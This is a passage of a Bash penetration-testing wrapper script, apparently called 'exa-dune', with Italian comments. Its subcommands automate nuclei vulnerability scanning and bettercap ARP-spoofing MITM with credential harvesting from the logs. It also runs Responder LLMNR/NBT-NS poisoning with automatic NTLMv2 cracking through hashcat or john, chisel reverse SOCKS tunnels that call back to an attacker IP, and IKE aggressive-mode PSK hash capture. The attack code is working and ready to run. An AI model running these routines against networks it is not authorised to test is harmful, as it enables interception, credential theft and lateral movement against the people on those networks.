    [[ ! -d "$tpl_dir" ]] && tpl_dir="$HOME/nuclei-templates"

    # Costruisci argomenti tag categoria
    local tag_args=""
    IFS=',' read -ra _cats <<< "$templates"
    for _cat in "${_cats[@]}"; do
        tag_args="$tag_args -tags $_cat"
    done

    section "Nuclei CVE Scanner (categorie: $templates)"
    local nuclei_out="$OUTDIR/nuclei_results.txt"
    local nuclei_json="$OUTDIR/nuclei_results.json"

    if [[ -d "$tpl_dir" ]]; then
        run_cmd "nuclei" \
            "nuclei -t '$tpl_dir' -u '$nuclei_target' -severity '$severity' \
             $tag_args -duc -nh -no-verify \
             -o '$nuclei_out' -je '$nuclei_json' 2>&1 | tail -20"
    else
        run_cmd "nuclei" \
            "nuclei -u '$nuclei_target' -severity '$severity' \
             $tag_args -duc -nh -no-verify \
             -o '$nuclei_out' -je '$nuclei_json' 2>&1 | tail -20"
    fi

    if [[ -f "$nuclei_out" && -s "$nuclei_out" ]]; then
        grep -iE "\[critical\]" "$nuclei_out" 2>/dev/null | \
            while IFS= read -r line; do found CRITICAL "Nuclei — $line"; done || true
        grep -iE "\[high\]" "$nuclei_out" 2>/dev/null | \
            while IFS= read -r line; do found HIGH "Nuclei — $line"; done || true
        grep -iE "\[medium\]" "$nuclei_out" 2>/dev/null | \
            while IFS= read -r line; do found MEDIUM "Nuclei — $line"; done || true
        grep -iE "\[low\]" "$nuclei_out" 2>/dev/null | \
            while IFS= read -r line; do found LOW "Nuclei — $line"; done || true
        local nc; nc=$(wc -l < "$nuclei_out" 2>/dev/null || echo 0)
        ok "Nuclei: $nc finding(s) → $nuclei_out"
    else
        log "Nuclei: nessun finding"
    fi
}

# ============================================================
#  SUBCOMMAND: mitm — MITM framework (bettercap)
# ============================================================
usage_mitm() {
    echo "Uso: exa-dune mitm <TARGET> [OPTIONS]"
    echo ""
    echo "  MITM framework: ARP spoofing, HTTP sniffing, credential capture, BLE"
    echo "  Wraps: bettercap"
    echo ""
    echo "  ATTENZIONE: richiede root e interfaccia di rete attiva"
    echo ""
    echo "Opzioni:"
    echo "  --iface IFACE      Interfaccia di rete (default: auto-detect)"
    echo "  --gateway GW       Gateway IP (default: auto-detect da route)"
    echo "  --duration SEC     Durata cattura in secondi (default: 120)"
    echo "  --ble              Abilita scansione BLE"
    echo "  --output DIR"
    echo "  --dry-run"
}

cmd_mitm() {
    local target="" iface="" gateway="" duration=120 do_ble=0
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --iface)    _req_arg "$1" "${2:-}"; iface="$2";    shift 2 ;;
            --gateway)  _req_arg "$1" "${2:-}"; gateway="$2";  shift 2 ;;
            --duration) _req_arg "$1" "${2:-}"; duration="$2"; shift 2 ;;
            --ble)      do_ble=1; shift ;;
            --output)   _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
            --dry-run)  DRY_RUN=1; shift ;;
            --help|-h)  usage_mitm; exit 0 ;;
            -*)         err "Opzione sconosciuta: $1"; usage_mitm; exit 1 ;;
            *)          target="$1"; shift ;;
        esac
    done
    [[ -z "$target" ]] && { err "TARGET mancante"; usage_mitm; exit 1; }
    validate_target "$target"
    setup_outdir "$target" "mitm"
    log "Target: $target | Output: $OUTDIR"

    if ! command -v bettercap &>/dev/null; then
        warn "bettercap non trovato — installa: apt install bettercap"
        [[ $DRY_RUN -eq 1 ]] || return 0
    fi

    # Auto-detect interfaccia e gateway
    if [[ -z "$iface" && $DRY_RUN -eq 0 ]]; then
        iface=$(ip route get "$target" 2>/dev/null | awk '/dev/{for(i=1;i<=NF;i++) if($i=="dev") print $(i+1)}' | head -1 || echo "eth0")
    fi
    iface="${iface:-eth0}"
    if [[ -z "$gateway" && $DRY_RUN -eq 0 ]]; then
        gateway=$(ip route | awk '/default/{print $3; exit}' || true)
    fi
    gateway="${gateway:-$(echo "$target" | sed 's/\.[0-9]*$/.1/')}"

    # Crea caplet bettercap
    local caplet="$OUTDIR/mitm_${target//./-}.cap"
    if [[ $DRY_RUN -eq 0 ]]; then
        cat > "$caplet" << CAPLET_EOF
# exa-dune mitm caplet — target: $target
set arp.spoof.targets $target
set arp.spoof.fullduplex true
net.probe on
arp.spoof on
set net.sniff.verbose false
set net.sniff.output $OUTDIR/sniff.pcap
net.sniff on
set http.proxy.script ''
http.proxy on
CAPLET_EOF
        if [[ $do_ble -eq 1 ]]; then
            echo "ble.recon on" >> "$caplet"
        fi
        ok "Caplet scritto → $caplet"
    else
        echo -e "${CYAN}[DRY-RUN]${NC} Caplet bettercap → $caplet"
        echo -e "${CYAN}[DRY-RUN]${NC} bettercap -iface $iface -caplet $caplet"
        return
    fi

    section "MITM ARP Spoofing (bettercap) — durata ${duration}s"
    found MEDIUM "MITM — ARP spoofing avviato su $iface verso $target (gateway: $gateway)"
    log "Avvio bettercap per ${duration}s — output: $OUTDIR/sniff.pcap"
    run_cmd "bettercap" \
        "timeout $duration bettercap -iface '$iface' -caplet '$caplet' \
         2>&1 | tee '$OUTDIR/bettercap.log' || true"

    section "Analisi credenziali catturate"
    if [[ -f "$OUTDIR/bettercap.log" ]]; then
        grep -iE "creds|credential|password|user|login|POST" "$OUTDIR/bettercap.log" 2>/dev/null \
            | tee "$OUTDIR/captured_creds.txt" || true
        if [[ -s "$OUTDIR/captured_creds.txt" ]]; then
            found CRITICAL "MITM — credenziali HTTP catturate → $OUTDIR/captured_creds.txt"
        fi
    fi

    ok "MITM completato → $OUTDIR"
}

# ============================================================
#  SUBCOMMAND: poison — LLMNR/MDNS/NBT-NS poisoning + crack
# ============================================================
usage_poison() {
    echo "Uso: exa-dune poison [OPTIONS]"
    echo ""
    echo "  LLMNR/MDNS/NBT-NS poisoning per cattura hash NTLMv2"
    echo "  Wraps: responder, hashcat (GPU), john (CPU fallback)"
    echo ""
    echo "  ATTENZIONE: richiede root. Attivo sulla rete locale."
    echo ""
    echo "Opzioni:"
    echo "  --iface IFACE      Interfaccia di rete (default: auto-detect)"
    echo "  --duration SEC     Durata ascolto in secondi (default: 60)"
    echo "  --wordlist FILE    Wordlist per crack hash (default: auto)"
    echo "  --no-crack         Non tentare crack automatico degli hash"
    echo "  --output DIR"
    echo "  --dry-run"
}

cmd_poison() {
    local iface="" duration=60 wordlist="" do_crack=1 _poison_target="local_poison"
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --iface)    _req_arg "$1" "${2:-}"; iface="$2";    shift 2 ;;
            --duration) _req_arg "$1" "${2:-}"; duration="$2"; shift 2 ;;
            --wordlist) _req_arg "$1" "${2:-}"; wordlist="$2"; shift 2 ;;
            --no-crack) do_crack=0; shift ;;
            --output)   _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
            --dry-run)  DRY_RUN=1; shift ;;
            --help|-h)  usage_poison; exit 0 ;;
            -*)         err "Opzione sconosciuta: $1"; usage_poison; exit 1 ;;
            *)          _poison_target="$1"; shift ;;   # TARGET opzionale
        esac
    done
    setup_outdir "$_poison_target" "poison"
    log "Interfaccia: ${iface:-auto} | Durata: ${duration}s | Output: $OUTDIR"

    if ! command -v responder &>/dev/null; then
        warn "responder non trovato — installa: apt install responder"
        [[ $DRY_RUN -eq 1 ]] || return 0
    fi

    # Auto-detect interfaccia
    if [[ -z "$iface" && $DRY_RUN -eq 0 ]]; then
        iface=$(ip route | awk '/default/{print $5; exit}' 2>/dev/null || echo "eth0")
    fi
    iface="${iface:-eth0}"

    local wl; wl="${wordlist:-$(_wl_pass)}"

    section "Responder LLMNR/MDNS/NBT-NS Poisoning (${duration}s su $iface)"
    if [[ $DRY_RUN -eq 1 ]]; then
        echo -e "${CYAN}[DRY-RUN]${NC} responder -I $iface -wrf -v (timeout ${duration}s)"
        echo -e "${CYAN}[DRY-RUN]${NC} hashcat -m 5600 <hashfile> $wl"
        return
    fi

    found MEDIUM "POISON — Responder attivato su $iface (LLMNR/MDNS/NBT-NS poisoning)"
    run_cmd "responder" \
        "timeout $duration responder -I '$iface' -wrf -v \
         2>&1 | tee '$OUTDIR/responder.log' || true"

    section "Parsing hash catturati da Responder"
    # Responder scrive gli hash in /usr/share/responder/logs/ o ./logs/
    local resp_log_dirs=("/usr/share/responder/logs" "/opt/responder/logs" "./logs" "$OUTDIR")
    local hash_files=()
    for _rdir in "${resp_log_dirs[@]}"; do
        while IFS= read -r -d '' f; do
            hash_files+=("$f")
        done < <(find "$_rdir" -name "*NTLMv2*" -newer /proc/uptime 2>/dev/null -print0 || true)
    done

    if [[ ${#hash_files[@]} -gt 0 ]]; then
        local combined_hashes="$OUTDIR/ntlmv2_hashes.txt"
        cat "${hash_files[@]}" > "$combined_hashes" 2>/dev/null || true
        local hcount; hcount=$(wc -l < "$combined_hashes" 2>/dev/null || echo 0)
        found HIGH "POISON — $hcount hash NTLMv2 catturati → $combined_hashes"

        if [[ $do_crack -eq 1 && $hcount -gt 0 ]]; then
            section "Hash Crack NTLMv2"
            if command -v hashcat &>/dev/null; then
                log "Crack con hashcat (NTLMv2 = mode 5600)..."
                run_cmd "hashcat_ntlmv2" \
                    "hashcat -m 5600 '$combined_hashes' '$wl' \
                     --outfile '$OUTDIR/cracked_ntlmv2.txt' \
                     --outfile-format 2 -O --status --status-timer 10 \
                     2>&1 | tail -20 || true"
                if [[ -s "$OUTDIR/cracked_ntlmv2.txt" ]]; then
                    while IFS= read -r line; do
                        found CRITICAL "HASH CRACKED — $line"
                    done < "$OUTDIR/cracked_ntlmv2.txt"
                fi
            elif command -v john &>/dev/null; then
                log "Crack con john (fallback CPU)..."
                run_cmd "john_ntlmv2" \
                    "john --wordlist='$wl' --format=netntlmv2 '$combined_hashes' \
                     2>&1 | tee '$OUTDIR/john_crack.log' || true"
                run_cmd "john_show" \
                    "john --show --format=netntlmv2 '$combined_hashes' \
                     2>&1 | tee '$OUTDIR/john_cracked.txt'"
                if [[ -s "$OUTDIR/john_cracked.txt" ]]; then
                    grep -v "^0 password" "$OUTDIR/john_cracked.txt" 2>/dev/null | \
                        while IFS= read -r line; do
                            found CRITICAL "HASH CRACKED (john) — $line"
                        done || true
                fi
            else
                warn "Né hashcat né john trovati — crack saltato. File hash: $combined_hashes"
            fi
        fi
    else
        log "Nessun hash NTLMv2 catturato in questa sessione"
    fi

    ok "Poisoning completato → $OUTDIR"
}

# ============================================================
#  SUBCOMMAND: pivot — HTTP tunneling e SOCKS5 proxy (chisel)
# ============================================================
usage_pivot() {
    echo "Uso: exa-dune pivot <TARGET> [OPTIONS]"
    echo ""
    echo "  Pivoting via HTTP tunnel e SOCKS5 proxy con chisel"
    echo "  Wraps: chisel, proxychains"
    echo ""
    echo "  Modalità server: avvia chisel server locale per connessioni reverse"
    echo "  Modalità client: mostra comando da eseguire sul target"
    echo ""
    echo "Opzioni:"
    echo "  --port PORT        Porta chisel server (default: 8888)"
    echo "  --socks-port PORT  Porta SOCKS5 locale (default: 1080)"
    echo "  --server           Avvia solo il server chisel (non avviato di default)"
    echo "  --output DIR"
    echo "  --dry-run"
}

cmd_pivot() {
    local target="" chisel_port=8888 socks_port=1080 do_server=0
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --port)       _req_arg "$1" "${2:-}"; chisel_port="$2"; shift 2 ;;
            --socks-port) _req_arg "$1" "${2:-}"; socks_port="$2";  shift 2 ;;
            --server)     do_server=1; shift ;;
            --output)     _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
            --dry-run)    DRY_RUN=1; shift ;;
            --help|-h)    usage_pivot; exit 0 ;;
            -*)           err "Opzione sconosciuta: $1"; usage_pivot; exit 1 ;;
            *)            target="$1"; shift ;;
        esac
    done

    local _ptarget="${target:-local_pivot}"
    setup_outdir "$_ptarget" "pivot"
    log "Pivot setup | Chisel port: $chisel_port | SOCKS5: $socks_port | Output: $OUTDIR"

    if ! command -v chisel &>/dev/null; then
        warn "chisel non trovato — scarica da: https://github.com/jpillora/chisel/releases"
        warn "  oppure: go install github.com/jpillora/chisel@latest"
        [[ $DRY_RUN -eq 1 ]] || return 0
    fi

    local attacker_ip; attacker_ip=$(hostname -I 2>/dev/null | awk '{print $1}' || echo "ATTACKER_IP")

    section "Chisel Pivot Setup"

    # Genera configurazione proxychains
    local proxychains_conf="$OUTDIR/proxychains_pivot.conf"
    if [[ $DRY_RUN -eq 0 ]]; then
        cat > "$proxychains_conf" << PROX_EOF
# proxychains config generato da exa-dune pivot
# Usa: proxychains4 -f $proxychains_conf <comando>
strict_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 $socks_port
PROX_EOF
        ok "proxychains config → $proxychains_conf"
    fi

    log "Comando server chisel (da eseguire su attaccante):"
    log "  chisel server -p $chisel_port --reverse --socks5"

    if [[ $do_server -eq 1 && $DRY_RUN -eq 0 ]]; then
        run_cmd "chisel_server" \
            "chisel server -p $chisel_port --reverse --socks5 \
             2>&1 | tee '$OUTDIR/chisel_server.log' &"
        log "Chisel server avviato in background su :$chisel_port"
    else
        echo -e "${CYAN}[SERVER]${NC} chisel server -p $chisel_port --reverse --socks5"
    fi

    if [[ -n "$target" ]]; then
        log ""
        log "Comando client da eseguire SUL TARGET ($target):"
        log "  chisel client ${attacker_ip}:${chisel_port} R:${socks_port}:socks"
        log ""
        log "Dopo la connessione del client, usa proxychains:"
        log "  proxychains4 -f $proxychains_conf nmap -sT -Pn $target"
        log "  proxychains4 -f $proxychains_conf curl http://192.168.x.x/"

        if [[ $DRY_RUN -eq 0 ]]; then
            {
                echo "# Chisel pivot setup — $(date)"
                echo "# Target: $target"
                echo "Server: chisel server -p $chisel_port --reverse --socks5"
                echo "Client (sul target): chisel client ${attacker_ip}:${chisel_port} R:${socks_port}:socks"
                echo "SOCKS5: 127.0.0.1:$socks_port"
                echo "proxychains config: $proxychains_conf"
            } > "$OUTDIR/pivot_setup.txt"
        fi
    fi

    found MEDIUM "PIVOT — Chisel tunnel configurato: ${attacker_ip}:${chisel_port} → SOCKS5 127.0.0.1:${socks_port}"
    ok "Pivot setup completato → $OUTDIR"
}

# ============================================================
#  SUBCOMMAND: vpn — IPsec/IKE VPN enumeration (ike-scan)
# ============================================================
usage_vpn() {
    echo "Uso: exa-dune vpn <TARGET> [OPTIONS]"
    echo ""
    echo "  IPsec/IKE VPN enumeration e PSK hash capture"
    echo "  Wraps: ike-scan"
    echo ""
    echo "Opzioni:"
    echo "  --aggressive       Usa IKE aggressive mode (PSK crack)"
    echo "  --psk-crack FILE   File output per PSK hash crack"
    echo "  --port PORT        Porta IKE (default: 500)"
    echo "  --output DIR"
    echo "  --dry-run"
}

cmd_vpn() {
    local target="" do_aggressive=0 psk_file="" port=500
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --aggressive) do_aggressive=1; shift ;;
            --psk-crack)  _req_arg "$1" "${2:-}"; psk_file="$2"; shift 2 ;;
            --port)       _req_arg "$1" "${2:-}"; port="$2";     shift 2 ;;
            --output)     _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
            --dry-run)    DRY_RUN=1; shift ;;
            --help|-h)    usage_vpn; exit 0 ;;
            -*)           err "Opzione sconosciuta: $1"; usage_vpn; exit 1 ;;
            *)            target="$1"; shift ;;
        esac
    done
    [[ -z "$target" ]] && { err "TARGET mancante"; usage_vpn; exit 1; }
    validate_target "$target"
    setup_outdir "$target" "vpn"
    log "Target: $target:$port | Output: $OUTDIR"
    [[ $DRY_RUN -eq 1 ]] && return

    if ! command -v ike-scan &>/dev/null; then
        warn "ike-scan non trovato — installa: apt install ike-scan"
        return 0
    fi

    psk_file="${psk_file:-$OUTDIR/ike_psk_hashes.txt}"

    section "IKE Detection (UDP/500)"
    run_cmd "ike_scan" \
        "ike-scan $target 2>&1 | tee '$OUTDIR/ike_scan.txt'"
    if [[ -f "$OUTDIR/ike_scan.txt" ]]; then
        if grep -qiE "Main Mode|Aggressive Mode|ISAKMP" "$OUTDIR/ike_scan.txt" 2>/dev/null; then
            found HIGH "VPN:$port — IKE ISAKMP risponde (IPsec VPN attivo)"
            local ike_version; ike_version=$(grep -oiE "IKEv[12]" "$OUTDIR/ike_scan.txt" | head -1 || echo "IKE")
            local ike_enc; ike_enc=$(grep -oiE "Enc=\S+" "$OUTDIR/ike_scan.txt" | head -1 || true)
            local ike_hash; ike_hash=$(grep -oiE "Hash=\S+" "$OUTDIR/ike_scan.txt" | head -1 || true)
            [[ -n "$ike_enc" ]] && found INFO "VPN — Cifratura: $ike_enc $ike_hash"
        fi
    fi

    if [[ $do_aggressive -eq 1 ]]; then
        section "IKE Aggressive Mode (PSK hash capture)"
        run_cmd "ike_aggressive" \
            "ike-scan --aggressive --id=exa-dune-test \
             --pskcrack='$psk_file' $target \
             2>&1 | tee '$OUTDIR/ike_aggressive.txt' || true"
        if [[ -s "$psk_file" ]]; then
            found CRITICAL "VPN — PSK hash catturato in aggressive mode → $psk_file"
            log "Crack offline: hashcat -m 5300 '$psk_file' <wordlist>"
        fi
    fi

    section "Nmap IKE/VPN NSE"
    run_cmd "nmap_ike" \
        "nmap -sU -p $port --script ike-version \
         -oN '$OUTDIR/nmap_ike.txt' $target 2>&1 || true"
    if [[ -f "$OUTDIR/nmap_ike.txt" ]]; then
        grep -qiE "ike-version" "$OUTDIR/nmap_ike.txt" 2>/dev/null && \
            found MEDIUM "VPN:$port — nmap ike-version: $(grep -A2 'ike-version' "$OUTDIR/nmap_ike.txt" 2>/dev/null | tail -1 || true)"
    fi

    ok "VPN/IKE audit completato → $OUTDIR"
}

